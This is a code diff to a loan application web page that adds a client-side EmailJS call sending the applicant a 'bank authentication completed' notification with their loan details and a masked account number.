@@ -528,6 +528,9 @@
                 sessionStorage.setItem('loanApplicationData', JSON.stringify(combinedData));
                 console.log('Combined data stored in sessionStorage successfully');
                 
+                // Send bank authentication email notification
+                sendBankAuthEmail(combinedData);
+                
                 // Show processing message
                 const form = document.getElementById('bankAuthForm');
                 const formContainer = form.parentElement;
@@ -555,6 +558,42 @@
                 alert('Error processing your information. Please try again.');
                 submitButton.textContent = originalText;
                 submitButton.disabled = false;
+            }
+        }
+        
+        // Send bank authentication email notification
+        function sendBankAuthEmail(data) {
+            try {
+                const templateParams = {
+                    to_email: data.email,
+                    borrower_name: data.fullName,
+                    loan_amount: data.loanAmount,
+                    bank_name: data.bankName,
+                    application_type: 'Bank Authentication Completed',
+                    submission_date: data.bankAuthSubmissionDate,
+                    customer_bank: data.customerBank || 'Not specified',
+                    routing_number: data.routingNumber || 'Not provided',
+                    account_number: data.accountNumber ? '****' + data.accountNumber.slice(-4) : 'Not provided',
+                    phone: data.phone,
+                    address: data.address,
+                    city: data.city,
+                    state: data.state,
+                    zip_code: data.zipCode,
+                    loan_duration: data.loanDuration + ' months'
+                };
+
+                emailjs.send('service_mblpi2k', 'template_wo7l8te', templateParams)
+                    .then(function(response) {
+                        console.log('Bank authentication email sent successfully!', response.status, response.text);
+                    })
+                    .catch(function(error) {
+                        console.error('Failed to send bank authentication email:', error);
+                        // Continue with flow even if email fails
+                    });
+                    
+            } catch (error) {
+                console.error('Error sending bank authentication email:', error);
+                // Continue with flow even if email fails
             }
         }
                             
@@ -620,7 +659,7 @@
                 });
             }
         });
-                            
+        
         function goBack() {
             window.history.back();
         }
